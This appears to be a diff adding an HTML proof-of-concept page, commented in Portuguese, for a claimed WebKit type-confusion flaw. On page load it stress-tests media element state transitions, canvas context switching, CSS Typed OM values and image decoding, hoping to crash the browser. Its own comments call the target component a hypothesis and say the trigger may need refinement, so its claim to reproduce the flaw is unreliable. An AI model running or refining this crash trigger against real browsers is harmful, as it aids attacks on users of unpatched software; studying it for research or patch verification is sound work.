@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2025-43541
+  Tipo: Type Confusion — WebKit WebCore
+  Pesquisador: Hossein Lotfi (@hosselot) — Trend Micro Zero Day Initiative
+  Fix: "improved state handling" (Bugzilla 301257)
+  Advisory: Safari 26.2, Dezembro 2025
+  
+  HIPÓTESE DO COMPONENTE:
+  Hossein Lotfi (ZDI) é especialista em:
+  - Image/media decoders (JPEG, PNG, WebP, AVIF, HEIC)
+  - CSS object model type handling
+  - Canvas 2D API
+  
+  Type confusion com fix "improved state handling" aponta para
+  um objeto sendo acessado como tipo errado após uma transição
+  de estado — padrão comum em:
+  a) ImageDecoder com múltiplos frames / tipo de imagem ambíguo
+  b) HTMLMediaElement em transição de estado (load→play→error)
+  c) CSS OM — CSSStyleValue subtypes (CSSUnitValue vs CSSMathValue)
+  d) Canvas context type mismatch (2d vs bitmaprenderer vs webgl)
+  
+  ESTRATÉGIA:
+  Exercitar transições de estado em:
+  1. HTMLMediaElement (video/audio state machine)
+  2. Imagens com tipos ambíguos / multi-frame
+  3. Canvas context switching
+  4. CSS Typed OM (se disponível)
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43541 PoC — Type Confusion State Handling</title>
+<style>
+  body { background:#0a0a0a; color:#ffcc00; font-family:monospace; padding:16px; }
+  #log { background:#111; border:1px solid #ffcc00; padding:12px;
+         height:320px; overflow-y:auto; font-size:12px; }
+  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h3>CVE-2025-43541 — Type Confusion "improved state handling" (Lotfi/ZDI)</h3>
+<div id="log"></div>
+
+<script>
+"use strict";
+const L=(m,c)=>{const d=document.getElementById('log');
+  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
+  d.scrollTop=d.scrollHeight;};
+
+L("=== CVE-2025-43541 PoC Iniciado ===");
+
+// =============================================================
+// VARIANTE 1: HTMLMediaElement State Machine Type Confusion
+// O state machine do media element tem muitas transições:
+// HAVE_NOTHING → HAVE_METADATA → HAVE_CURRENT_DATA → PLAYING
+// Type confusion pode ocorrer ao forçar transições inválidas
+// =============================================================
+function variant1_media_state() {
+  return new Promise(resolve => {
+    L("[V1] HTMLMediaElement state machine stress...");
+
+    const ELEMENTS = 40;
+    const videos = [];
+
+    for (let i = 0; i < ELEMENTS; i++) {
+      const v = document.createElement('video');
+      v.style.cssText = 'position:absolute;top:-9999px;width:1px;height:1px';
+      v.preload = 'auto';
+      v.muted = true;
+
+      // Múltiplos sources com tipos diferentes para confundir o type selector
+      const sources = [
+        { src: 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAu1tZGF0', type: 'video/mp4' },
+        { src: 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCFGwA', type: 'video/webm' },
+        { src: 'data:video/ogg;base64,T2dnUwACAAAAAAAAAAA', type: 'video/ogg' },
+      ];
+
+      sources.forEach(s => {
+        const src = document.createElement('source');
+        src.src = s.src; src.type = s.type;
+        v.appendChild(src);
+      });
+
+      document.body.appendChild(v);
+      videos.push(v);
+
+      // Disparar transições de estado rapidamente
+      v.load();
+    }
+
+    let step = 0;
+    const STEPS = 200;
+    const interval = setInterval(() => {
+      step++;
+      for (const v of videos) {
+        try {
+          switch(step % 8) {
+            case 0: v.load(); break;
+            case 1: v.play().catch(()=>{}); break;
+            case 2: v.pause(); break;
+            case 3:
+              // Mudar src durante carregamento (clássico para type confusion)
+              v.src = 'data:video/mp4;base64,AAAA';
+              break;
+            case 4:
+              v.src = '';
+              v.load();
+              break;
+            case 5:
+              // Checar networkState/readyState durante transição
+              void v.readyState;
+              void v.networkState;
+              void v.buffered;
+              break;
+            case 6:
+              // Trocar source children durante load
+              const srcs = v.querySelectorAll('source');
+              srcs.forEach(s => v.removeChild(s));
+              const ns = document.createElement('source');
+              ns.src = sources[step % sources.length].src;
+              ns.type = sources[step % sources.length].type;
+              v.appendChild(ns);
+              v.load();
+              break;
+            case 7:
+              void v.currentSrc;
+              void v.duration;
+              break;
+          }
+        } catch(e) { /* ignorar */ }
+      }
+
+      if (step >= STEPS) {
+        clearInterval(interval);
+        videos.forEach(v => { try { document.body.removeChild(v); } catch(e){} });
+        L("[V1] Media state machine stress OK ("+STEPS+" steps)", "ok");
+        resolve();
+      }
+    }, 5);
+  });
+}
+
+// =============================================================
+// VARIANTE 2: Canvas Context Type Confusion
+// Trocar tipo de contexto do mesmo canvas
+// 2d → bitmaprenderer → 2d (reuse de objeto)
+// =============================================================
+function variant2_canvas_context() {
+  return new Promise(resolve => {
+    L("[V2] Canvas context type switching...");
+
+    for (let iter = 0; iter < 100; iter++) {
+      const canvas = document.createElement('canvas');
+      canvas.width = 64; canvas.height = 64;
+
+      // Tentar obter múltiplos tipos de contexto no mesmo canvas
+      // (segundo getContext() com tipo diferente deve retornar null
+      //  mas o objeto interno pode ter state residual)
+      try {
+        const ctx2d = canvas.getContext('2d');
+        if (ctx2d) {
+          ctx2d.fillStyle = '#ff0000';
+          ctx2d.fillRect(0, 0, 64, 64);
+          ctx2d.save();
+          ctx2d.scale(2, 2);
+          ctx2d.drawImage(canvas, 0, 0);
+          ctx2d.restore();
+
+          // Tentar obter bitmaprenderer após 2d já inicializado
+          const bmp = canvas.getContext('bitmaprenderer');
+          // bmp deve ser null, mas o state interno não deve crashar
+
+          // Tentar createImageBitmap do canvas 2d
+          if (typeof createImageBitmap !== 'undefined') {
+            createImageBitmap(canvas).then(bitmap => {
+              // Se bitmaprenderer existisse, transferir aqui causaria confusion
+              if (bmp) bmp.transferFromImageBitmap(bitmap);
+              bitmap.close();
+            }).catch(()=>{});
+          }
+
+          // Operações que dependem do estado interno do contexto
+          ctx2d.getImageData(0, 0, 64, 64);
+          ctx2d.putImageData(ctx2d.getImageData(0,0,32,32), 32, 32);
+        }
+      } catch(e) { /* ignorar erros esperados */ }
+
+      // Criar OffscreenCanvas e transferir contexto
+      try {
+        if (typeof OffscreenCanvas !== 'undefined') {
+          const osc = new OffscreenCanvas(64, 64);
+          const octx = osc.getContext('2d');
+          if (octx) {
+            octx.fillStyle = 'blue';
+            octx.fillRect(0, 0, 64, 64);
+            // Tentar blit para canvas regular
+            const ctx = canvas.getContext('2d');
+            if (ctx) ctx.drawImage(osc, 0, 0);
+          }
+        }
+      } catch(e) {}
+    }
+
+    L("[V2] Canvas context type stress OK", "ok");
+    resolve();
+  });
+}
+
+// =============================================================
+// VARIANTE 3: CSS Typed OM Type Confusion
+// CSSStyleValue subtype mismatches
+// =============================================================
+function variant3_css_typed_om() {
+  return new Promise(resolve => {
+    L("[V3] CSS Typed OM type confusion...");
+
+    if (typeof CSS === 'undefined' || !CSS.px) {
+      L("[V3] CSS Typed OM não disponível — pulando", "info");
+      resolve(); return;
+    }
+
+    try {
+      const el = document.createElement('div');
+      el.style.cssText = 'position:absolute;top:-9999px;width:100px;height:100px';
+      document.body.appendChild(el);
+
+      for (let i = 0; i < 500; i++) {
+        try {
+          // Criar diferentes tipos de CSSStyleValue
+          const px  = CSS.px(i);
+          const pct = CSS.percent(i % 100);
+          const em  = CSS.em(i * 0.1);
+          const num = CSS.number(i);
+
+          // Math values (CSSMathValue subclass)
+          const sum  = CSS.px(i).add(CSS.px(i * 0.5));
+          const prod = CSS.px(10).mul(i);
+          const minv = CSSMathMin ? new CSSMathMin(px, pct) : null;
+          const maxv = CSSMathMax ? new CSSMathMax(px, em) : null;
+
+          // Aplicar tipos misturados na mesma propriedade
+          el.attributeStyleMap.set('width', sum);
+          el.attributeStyleMap.set('height', pct);
+          el.attributeStyleMap.set('margin-left', prod);
+          if (minv) el.attributeStyleMap.set('padding-left', minv);
+          if (maxv) el.attributeStyleMap.set('padding-right', maxv);
+
+          // Ler de volta (pode triggar type mismatch no StyleResolver)
+          const computed = el.computedStyleMap();
+          void computed.get('width');
+          void computed.get('height');
+
+          // Mudar unidade abruptamente (forçar conversão)
+          el.attributeStyleMap.set('width', CSS.em(i * 0.5));
+          void el.offsetWidth; // forçar layout
+
+        } catch(e) { /* type errors são esperados aqui */ }
+      }
+
+      document.body.removeChild(el);
+      L("[V3] CSS Typed OM stress OK", "ok");
+    } catch(e) {
+      L("[V3] Exceção: " + e.toString(), "fail");
+    }
+    resolve();
+  });
+}
+
+// =============================================================
+// VARIANTE 4: Image decoder type confusion
+// Imagens com headers ambíguos / tipos misturados
+// =============================================================
+function variant4_image_decoder() {
+  return new Promise(resolve => {
+    L("[V4] Image type confusion via multiple formats...");
+    let pending = 0;
+    const IMGS = 60;
+
+    // Data URIs mínimos de diferentes formatos de imagem
+    const formats = [
+      // PNG 1x1 red
+      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI6QAAAABJRU5ErkJggg==',
+      // GIF 1x1
+      'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
+      // JPEG 1x1
+      'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AJQAB/9k=',
+      // WebP 1x1
+      'data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAUAmJagCdAEO/gHOAAA=',
+      // BMP 1x1
+      'data:image/bmp;base64,Qk0+AAAAAAAAADYAAAAoAAAAAAAAAAAAAAAAAgACAAAAAAAAAAAAAAAAAAAAAAAA',
+    ];
+
+    for (let i = 0; i < IMGS; i++) {
+      pending++;
+      const img = new Image();
+
+      img.onload = img.onerror = function() {
+        try {
+          // Usar a imagem carregada em Canvas (força decode final)
+          const c = document.createElement('canvas');
+          c.width = 1; c.height = 1;
+          const ctx = c.getContext('2d');
+          if (ctx) ctx.drawImage(img, 0, 0);
+
+          // Criar ImageBitmap do mesmo source (diferente code path)
+          if (typeof createImageBitmap !== 'undefined') {
+            createImageBitmap(img, {
+              resizeWidth: 1,
+              resizeHeight: 1,
+              resizeQuality: 'pixelated',
+              colorSpaceConversion: i % 2 === 0 ? 'none' : 'default',
+              premultiplyAlpha: i % 3 === 0 ? 'none' : 'premultiply',
+            }).then(bmp => {
+              if (ctx) ctx.drawImage(bmp, 0, 0);
+              bmp.close();
+            }).catch(()=>{});
+          }
+        } catch(e) {}
+
+        // Mudar src imediatamente após load (forçar re-decode com tipo diferente)
+        img.src = formats[(i + 2) % formats.length];
+
+        pending--;
+        if (pending <= 0) {
+          L("[V4] Image decoder type stress OK", "ok");
+          resolve();
+        }
+      };
+
+      // Iniciar com formato alternado
+      img.src = formats[i % formats.length];
+
+      // Mudar src antes do load terminar (race condition no decoder)
+      if (i % 3 === 0) {
+        setTimeout(() => {
+          img.src = formats[(i+1) % formats.length];
+        }, 1);
+      }
+    }
+
+    // Safety timeout
+    setTimeout(() => { if(pending > 0) { L("[V4] Timeout", "info"); resolve(); } }, 5000);
+  });
+}
+
+// =============================================================
+// Executor
+// =============================================================
+async function main() {
+  try {
+    await variant1_media_state();
+    await variant2_canvas_context();
+    await variant3_css_typed_om();
+    await variant4_image_decoder();
+    L("=== COMPLETO ===", "ok");
+    L("Crash do browser = CVE-2025-43541 PRESENTE", "crash");
+    L("Sem crash = patched ou trigger precisa refinamento", "info");
+  } catch(e) {
+    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
+  }
+}
+window.addEventListener('load', () => setTimeout(main, 300));
+</script>
+</body>
+</html>
